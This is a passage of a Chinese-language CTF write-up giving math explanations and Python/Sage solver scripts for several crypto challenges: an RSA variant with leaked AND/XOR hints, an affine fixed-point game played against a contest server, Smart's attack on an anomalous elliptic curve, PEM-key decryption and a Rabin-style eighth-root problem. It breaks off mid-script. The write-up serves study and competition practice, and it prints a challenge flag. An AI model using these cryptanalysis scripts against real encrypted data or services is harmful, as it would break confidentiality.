<p>由$N&#x3D;pqsr$和$n&#x3D;pq$可以推出$RS&#x3D;r\cdot s&#x3D;N&#x2F;n$<br>又因为<code>gift1 = s&amp;r</code> <code>gift2 = s^r</code><br>对任意整数 $a,b$，有恒等式：$a+b&#x3D;(a\oplus b)+2\cdot(a\&amp;b)$。<br>所以$S&#x3D;r+s &#x3D; \text{gift2} + 2\cdot \text{gift1}$<br>于是 $r,s$ 是方程 $x^2 - Sx + RS &#x3D; 0$ 的两根：<br>令 $D&#x3D;S^2-4RS$，若 $\sqrt D$ 为整数，则$r&#x3D;\frac{S-\sqrt D}{2},\quad s&#x3D;\frac{S+\sqrt D}{2}.$<br>找到 $r,s$ 后即可只在模 $rs$ 上解密：<br>  $\lambda(rs)&#x3D;\mathrm{lcm}(r-1,s-1)$，$d\equiv e^{-1}\pmod{\lambda(rs)}$，<br>  $m\equiv c^d \pmod{rs}$。由于 flag 很短（$m&lt;rs$），直接得到明文。</p>
<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd, isqrt</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line">N = <span class="number">12114282140129030221139165720039766369206816602912543911543781978648770300084428613171061953060266384429841484428732215252368009811130875276347534941874714457297474025227060487490713853301440917877280771734998220874195868270983517296552761924477514745040473578887509936945790259245154138347432294762694643113545451605193155323886625417458980089197202274810691448592725400564114850712497863770625334209249566232989992606497076063348029665644680946906322428277225178838518025623254240893146791821359089473224900379808514993113560101567320224162858217031176854613011276425771708406954417610317789259885040739954642374667</span></span><br><span class="line">n = <span class="number">91891351711379799931394178123406137903027189477005569059936904007248535049052097057222486024223574959494899324706948906013350601442586596023020519058250868888847562977333671773188012014902448961387215600156932673504112816058893268362611211565216592933077956777032650164332488098756557422740070442941348084921</span></span><br><span class="line">c = <span class="number">3231265723829112665640925095346482445691074656152495613367006320791218303024667683148786980985160622882017055128261102169256263170652774489339801477001275058585666508737704987192764426162573977263344192886400249198007892940084066468570229353879431384001463041292940472308358540532108957894938586227682908251475990882169979412586767210087025064295224506676379057986353004282550774815876093769770845018817117647615011444989401149674886486770646765454314760906436659162076044268401041579090930954919862146749470426101754009562077505810024012143379326028465156444246440949112724465484939452061684185387430755268355807999</span></span><br><span class="line">gift1 = <span class="number">10475668758451987289276918780968515546700284023143612685496241510488708701498972819305540608876501965534227236009502810417525671358108167575178008316645429</span></span><br><span class="line">gift2 = <span class="number">2089035701361172996472331829521141923363322027241591404259262848963755908765054555529259508147866255819680957406084877552079796025933552021516283158425474</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># helper: lcm for two numbers</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lcm2</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">return</span> a // gcd(a, b) * b  <span class="comment"># use // first to avoid overflow</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. compute r*s = RS</span></span><br><span class="line">RS = N // n</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. compute r + s = S</span></span><br><span class="line">S = gift2 + <span class="number">2</span> * gift1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. solve quadratic for r,s</span></span><br><span class="line">D = S * S - <span class="number">4</span> * RS</span><br><span class="line">sqrtD = isqrt(D)</span><br><span class="line">r = (S - sqrtD) // <span class="number">2</span></span><br><span class="line">s = (S + sqrtD) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># (optional sanity check)</span></span><br><span class="line"><span class="comment"># assert r * s == RS</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. RSA private exponent mod r*s</span></span><br><span class="line">lam = lcm2(r - <span class="number">1</span>, s - <span class="number">1</span>)</span><br><span class="line">d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, lam)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. decrypt</span></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, r * s)</span><br><span class="line">flag = long_to_bytes(m)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<p>syc{we1c0me_t190_ge1k_your_code_is_v1ey_de1psrc!}</p>
<h3 id="Caesar-Slot-Machine"><a href="#Caesar-Slot-Machine" class="headerlink" title="Caesar Slot Machine"></a>Caesar Slot Machine</h3><p>服务端每轮给出线性同余变换$f(x)&#x3D;a\cdot x + b \pmod P$，然后随机迭代 $i\in[1,1000]$ 次，要求给出的$x$ 满足$f^{(i)}(x)\equiv x\pmod P$。<br>只要让$x$成为这个仿射变换的不动点即可，即解方程<br>$x \equiv a x + b \pmod P \Rightarrow (1-a)x \equiv b \pmod P<br>\Rightarrow x \equiv \frac{b}{1-a} \equiv -b\cdot (a-1)^{-1} \pmod P$<br>由于题中$a\in[2,P-1]$，所以 $a\not\equiv1\pmod P$，逆元一定存在；这样无论服务端抽到哪个$i$，都有$f^{(i)}(x)&#x3D;x$。</p>
<p>另外，题面把提示串做了凯撒移位，但数字和符号未变，所以无需解密，直接从第一行抓出三个数字（按顺序就是 $a,b,P$）即可。</p>
<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;geek.ctfplus.cn&quot;</span></span><br><span class="line">PORT = <span class="number">30742</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;info&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve_round</span>(<span class="params">io</span>):</span><br><span class="line">    <span class="comment"># 第一行形如：&quot;...: A: &#123;a&#125; B: &#123;b&#125; P: &#123;P&#125;\n&quot;</span></span><br><span class="line">    line1 = io.recvuntil(<span class="string">b&quot;\n&quot;</span>, drop=<span class="literal">False</span>)</span><br><span class="line">    <span class="comment"># 第二行形如：&quot;.... X: &quot;（字母被凯撒移位，但冒号和空格不变）</span></span><br><span class="line">    io.recvuntil(<span class="string">b&quot;: &quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 直接从第一行提取数字（按顺序即 a, b, P）</span></span><br><span class="line">    nums = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, re.findall(<span class="string">rb&quot;\d+&quot;</span>, line1)))</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(nums) &lt; <span class="number">3</span>:</span><br><span class="line">        <span class="comment"># 保险：如果第一行没抓全，就把已收数据也拼上再抓</span></span><br><span class="line">        pending = io.recvuntil(<span class="string">b&quot;: &quot;</span>, drop=<span class="literal">False</span>)</span><br><span class="line">        nums = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, re.findall(<span class="string">rb&quot;\d+&quot;</span>, line1 + pending)))</span><br><span class="line">    a, b, P = nums[<span class="number">0</span>], nums[<span class="number">1</span>], nums[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 计算不动点 x = -b * (a-1)^&#123;-1&#125; mod P</span></span><br><span class="line">    inv = <span class="built_in">pow</span>((a - <span class="number">1</span>) % P, P - <span class="number">2</span>, P)  <span class="comment"># P 为质数，费马小定理</span></span><br><span class="line">    x = (-b % P) * inv % P</span><br><span class="line"></span><br><span class="line">    io.sendline(<span class="built_in">str</span>(x).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    io = remote(HOST, PORT)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">for</span> rnd <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">30</span>):</span><br><span class="line">            solve_round(io)</span><br><span class="line">            resp = io.recvline(timeout=<span class="number">5</span>)  <span class="comment"># &quot;Correct!\n&quot; 或 &quot;Wrong!\n&quot;</span></span><br><span class="line">            <span class="keyword">if</span> resp <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                log.failure(<span class="string">&quot;No response&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            log.info(resp.strip().decode(errors=<span class="string">&quot;ignore&quot;</span>))</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&quot;Wrong&quot;</span> <span class="keyword">in</span> resp:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 成功 30 轮后会返回 &quot;Flag: SYC&#123;...&#125;\n&quot;</span></span><br><span class="line">        <span class="comment"># 继续把后续行读出来并打印</span></span><br><span class="line">        data = io.recvrepeat(<span class="number">1.0</span>)</span><br><span class="line">        <span class="keyword">if</span> data:</span><br><span class="line">            <span class="built_in">print</span>(data.decode(errors=<span class="string">&quot;ignore&quot;</span>))</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        io.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h3 id="ez-ecc"><a href="#ez-ecc" class="headerlink" title="ez_ecc"></a>ez_ecc</h3><p>chal.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = <span class="number">0xfba8cae6451eb4c413b60b892ee2d517dfdb17a52451776a68efa34485619411</span></span><br><span class="line">A = <span class="number">0x1ef1e93d0f9acda1b7c0172f27d28f3a7d0f2d9343513a3aac191e12f6e51123</span></span><br><span class="line">B = <span class="number">0xcad65954bbe0fb8f2f9c22b5cae1aa42306fd58e8394652818e781e5f808e17a</span></span><br><span class="line"></span><br><span class="line">E = EllipticCurve(GF(p), [A, B])</span><br><span class="line"></span><br><span class="line">P_x = <span class="number">0x708c0cf66f132122f3fcd1f75c6f22d4a90d34650dd81fb3a57b75dad98d35e7</span></span><br><span class="line">P_y = <span class="number">0xcfb017daf37cbba3c6a5c6e7c4327692595c16b47e4bfa1ad400bffe5b500fba</span></span><br><span class="line">P = E(P_x, P_y)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&quot;SYC&#123;...&#125;&quot;</span></span><br><span class="line">k = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">Q = k * P</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Q = <span class="subst">&#123;Q&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 把题目公开数据写成 JSON（只包含 p, A, B, P, Q）</span></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">challenge = &#123;</span><br><span class="line">    <span class="string">&quot;p&quot;</span>: <span class="built_in">hex</span>(p),</span><br><span class="line">    <span class="string">&quot;A&quot;</span>: <span class="built_in">hex</span>(A),</span><br><span class="line">    <span class="string">&quot;B&quot;</span>: <span class="built_in">hex</span>(B),</span><br><span class="line">    <span class="string">&quot;P_x&quot;</span>: <span class="built_in">hex</span>(P_x),</span><br><span class="line">    <span class="string">&quot;P_y&quot;</span>: <span class="built_in">hex</span>(P_y),</span><br><span class="line">    <span class="string">&quot;Q_x&quot;</span>: <span class="built_in">hex</span>(Integer(Q[<span class="number">0</span>])),</span><br><span class="line">    <span class="string">&quot;Q_y&quot;</span>: <span class="built_in">hex</span>(Integer(Q[<span class="number">1</span>])),</span><br><span class="line">    <span class="comment"># 如果你想把答案写入文件（但不要发布到题目页面）</span></span><br><span class="line">    <span class="string">&quot;secret_k&quot;</span>: <span class="built_in">int</span>(k)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;challenge.json&quot;</span>,<span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    json.dump(challenge, f, indent=<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;challenge.json written. secret k =&quot;</span>, k)</span><br></pre></td></tr></table></figure>

<p>Smart attack</p>
<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># ----- 题目参数 -----</span></span><br><span class="line">p = <span class="number">0xfba8cae6451eb4c413b60b892ee2d517dfdb17a52451776a68efa34485619411</span></span><br><span class="line">A = <span class="number">0x1ef1e93d0f9acda1b7c0172f27d28f3a7d0f2d9343513a3aac191e12f6e51123</span></span><br><span class="line">B = <span class="number">0xcad65954bbe0fb8f2f9c22b5cae1aa42306fd58e8394652818e781e5f808e17a</span></span><br><span class="line">E = EllipticCurve(GF(p), [A, B])</span><br><span class="line"></span><br><span class="line">Px = <span class="number">0x708c0cf66f132122f3fcd1f75c6f22d4a90d34650dd81fb3a57b75dad98d35e7</span></span><br><span class="line">Py = <span class="number">0xcfb017daf37cbba3c6a5c6e7c4327692595c16b47e4bfa1ad400bffe5b500fba</span></span><br><span class="line">Qx = <span class="number">97490713033364940809544067604441149095210096571946998449251275861394744757515</span></span><br><span class="line">Qy = <span class="number">32198694245056943922016695558131047889851279706531342583322750112905104448879</span></span><br><span class="line"></span><br><span class="line">P = E(Px, Py)</span><br><span class="line">Q = E(Qx, Qy)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 自检：异常曲线/生成元</span></span><br><span class="line"><span class="keyword">assert</span> E.cardinality() == p</span><br><span class="line"><span class="keyword">assert</span> p*P == E(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">smart_attack_via_padic</span>(<span class="params">P, Q, p</span>):</span><br><span class="line">    E = P.curve()</span><br><span class="line">    E_Qp = EllipticCurve(Qp(p, <span class="number">4</span>), [ZZ(a) + ZZ(randint(<span class="number">0</span>, p))*p <span class="keyword">for</span> a <span class="keyword">in</span> E.a_invariants()])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># lift 点的 x，再挑 y 与 F_p 中的一致</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">lift_point</span>(<span class="params">XY</span>):</span><br><span class="line">        x0, y0 = XY.xy()</span><br><span class="line">        cands = E_Qp.lift_x(ZZ(x0), <span class="built_in">all</span>=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">for</span> R <span class="keyword">in</span> cands:</span><br><span class="line">            <span class="keyword">if</span> GF(p)(R.xy()[<span class="number">1</span>]) == y0:</span><br><span class="line">                <span class="keyword">return</span> R</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">&quot;lift_x 找不到匹配的 y（不应发生）&quot;</span>)</span><br><span class="line"></span><br><span class="line">    P_lift = lift_point(P)</span><br><span class="line">    Q_lift = lift_point(Q)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 在 Qp 上做 [p] 倍</span></span><br><span class="line">    pP = p * P_lift</span><br><span class="line">    pQ = p * Q_lift</span><br><span class="line"></span><br><span class="line">    <span class="comment"># formal parameter t = -x/y；对异常曲线，有 [p](t) ≈ p*t（p-adic）</span></span><br><span class="line">    xP, yP = pP.xy()</span><br><span class="line">    xQ, yQ = pQ.xy()</span><br><span class="line">    phiP = -(xP / yP)</span><br><span class="line">    phiQ = -(xQ / yQ)</span><br><span class="line"></span><br><span class="line">    k = phiQ / phiP                      <span class="comment"># k ∈ Qp</span></span><br><span class="line">    k = ZZ(k) % p                        <span class="comment"># 化成 0..p-1 的代表元</span></span><br><span class="line">    <span class="keyword">return</span> k</span><br><span class="line"></span><br><span class="line">k = smart_attack_via_padic(P, Q, p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;k =&quot;</span>, k)</span><br><span class="line"></span><br><span class="line">flag_bytes = long_to_bytes(<span class="built_in">int</span>(k))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;flag =&quot;</span>, flag_bytes)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sage -pip install pycryptodome</span><br><span class="line">sage -python exp.py</span><br></pre></td></tr></table></figure>

<h3 id="pem"><a href="#pem" class="headerlink" title="pem"></a>pem</h3><p>给了.pem格式的私钥</p>
<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives <span class="keyword">import</span> serialization</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取私钥（这是未加密 PKCS#8，512-bit RSA）</span></span><br><span class="line">pem = Path(<span class="string">&quot;key.pem&quot;</span>).read_bytes()</span><br><span class="line">key = serialization.load_pem_private_key(pem, password=<span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取 64 字节密文块（512-bit）</span></span><br><span class="line">c = <span class="built_in">int</span>.from_bytes(Path(<span class="string">&quot;enc&quot;</span>).read_bytes(), <span class="string">&quot;big&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 取出 RSA 参数</span></span><br><span class="line">priv = key.private_numbers()</span><br><span class="line">n = priv.public_numbers.n</span><br><span class="line">d = priv.d</span><br><span class="line"></span><br><span class="line"><span class="comment"># textbook RSA 解密：m = c^d mod n，然后去掉前导 0</span></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n).to_bytes((n.bit_length()+<span class="number">7</span>)//<span class="number">8</span>, <span class="string">&quot;big&quot;</span>).lstrip(<span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(m.decode())</span><br></pre></td></tr></table></figure>

<h3 id="baby-rabin"><a href="#baby-rabin" class="headerlink" title="baby_rabin"></a>baby_rabin</h3><p>chal.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> next_prime</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line">e=<span class="number">8</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    p = getPrime(<span class="number">512</span>)</span><br><span class="line">    q = next_prime(p + <span class="number">2</span> ** <span class="number">400</span>)</span><br><span class="line">    r = getPrime(<span class="number">512</span>)</span><br><span class="line">    <span class="keyword">if</span>(p%<span class="number">4</span>==<span class="number">3</span> <span class="keyword">and</span> q%<span class="number">4</span>==<span class="number">3</span> <span class="keyword">and</span> r%<span class="number">4</span>==<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">assert</span> p%<span class="number">4</span>==<span class="number">3</span> <span class="keyword">and</span> q%<span class="number">4</span>==<span class="number">3</span> <span class="keyword">and</span> r%<span class="number">4</span>==<span class="number">3</span></span><br><span class="line">n=p*q*r</span><br><span class="line">hint=p*q</span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">C=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;C=<span class="subst">&#123;C&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n=<span class="subst">&#123;n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;hint=<span class="subst">&#123;hint&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ol>
<li>已知 $n&#x3D;pqr$ 且给了 $hint&#x3D;pq$，因此 $r &#x3D; n &#x2F;&#x2F; hint$ 可直接得到。</li>
<li>有 $C ≡ m^8 (mod n)$，从而 $C ≡ m^8 (mod r)$；r 为 512 位素数且 $r ≡ 3 (mod 4)$。</li>
<li>设 $r-1 &#x3D; 2^s * t$ 且 t 为奇数。因为 $r ≡ 3 (mod 4) ⇒ s &#x3D; 1$，只含一个因子 2。</li>
<li>在模 r 的乘法群中，取 $a ≡ 8^{-1} (mod t)$，则 $C^a ≡ m^{8a} ≡ m^{1 + k*t} ≡ m * (m^t)^k$。<br> 又因 $s &#x3D; 1，(m^t) ∈ {±1}$，于是 8 次方根只有两种可能：u 和 r-u。</li>
<li>flag 整数 m 远小于 512 位的 r，因此两候选中较小的就是明文。</li>
</ol>
<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># ===== 题目中给定的数值 =====</span></span><br><span class="line">C = <span class="number">451731346880007131332999430306985234187530419447859396067624968918101700861978676040615622417464916959678829732066195225132545956101693588984833424213755513877236702139360270137668415610295492436471366218119012903840729628449361663941761372974624789549775182866112541811446267811259781269568865266459437049508062916974638523947634702667929562107001830919422408810565410106056693018550877651160930860996772712877149329227066558481842344525735406568814917991752005</span></span><br><span class="line">n = <span class="number">491917847075013900815069309520768928274976990404751846981543204333198666419468384809286945880906855848713238459489821614928060098982194326560178675579884014989600009897895019721278191710357177079087876324831068589971763176646200619528739550876421709762258644696629617862167991346900122049024287039400659899610706153110527311944790794239992462632602379626260229348762760395449238458507745619804388510205772573967935937419407673995019892908904432789586779953769907</span></span><br><span class="line">hint = <span class="number">66035251530240295423188999524554429498804416520951289016547753908652377333150838269168825344004730830028024338415783274479674378412532765763584271087554367024433779628323692638506285635583547190049386810983085033061336995321777237180762044362497604095831885258146390576684671783882528186837336673907983527353</span></span><br><span class="line">e = <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ===== 第一步：拿到 r =====</span></span><br><span class="line"><span class="keyword">assert</span> n % hint == <span class="number">0</span>, <span class="string">&quot;hint 应该整除 n&quot;</span></span><br><span class="line">r = n // hint</span><br><span class="line"></span><br><span class="line"><span class="comment"># 基本健壮性检查（与题面一致）</span></span><br><span class="line"><span class="keyword">assert</span> r % <span class="number">4</span> == <span class="number">3</span>, <span class="string">&quot;r 不是 3 mod 4，题设不成立？&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ===== 第二步：分解 r-1 的 2-adic 形状 r-1 = 2^s * t (t 为奇数) =====</span></span><br><span class="line">phi = r - <span class="number">1</span></span><br><span class="line">s = <span class="number">0</span></span><br><span class="line">tmp = phi</span><br><span class="line"><span class="keyword">while</span> tmp % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">    tmp //= <span 